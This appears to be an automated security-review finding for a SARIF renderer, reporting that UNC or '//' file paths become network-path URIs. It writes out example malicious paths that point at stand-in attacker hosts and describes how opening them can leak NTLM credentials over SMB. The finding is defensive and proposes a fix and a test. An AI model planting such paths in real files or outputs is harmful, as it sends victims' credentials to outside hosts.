# Review 1fe28a6d-eef3-4348-b68f-1f538f953327 — sarif-junit-and-sticky-pr-comment-render, round 4

- Commit: 752343a
- Angle: the three safety probes: egress, secrets, sandbox escape
- Result: pass
- 1 findings

## Medium (1)

- **A UNC or '//' path becomes a network-path SARIF URI that resolves to a remote host** — `src/lib/kit/render.js:102` (security): fileUri turns backslashes into '/' and passes a leading empty segment through. So a finding file '\\attacker.example\share\x.js' (or '//evil.example/x.js') is emitted as artifactLocation.uri '//attacker.example/share/x.js'. Under RFC 3986 that is a network-path reference whose authority is attacker.example. Confirmed: new URL(uri, 'file:///C:/repo/').href gives 'file://attacker.example/share/x.js'. A SARIF viewer on Windows (VS Code SARIF viewer, the IDE after a code-scanning download) that resolves the location and opens it reaches out over SMB to that host, which is egress to an unexpected host and can leak NTLM credentials. f.file comes from the findings JSON, which a review agent may fill with paths taken from PR content. The same code is in .claude/helpers/kit/render.js:102. No test covers a UNC or '//' input. — fix: In fileUri, refuse or neutralise a path that starts with '//' after backslash normalisation: either throw a KitExit for UNC/absolute non-drive paths in normalize, or drop the leading empty segments (or prefix './') so the result is always a relative path reference. Add a test that '\\\\host\\share\\x.js' and '//host/x.js' never yield a uri starting with '//'.
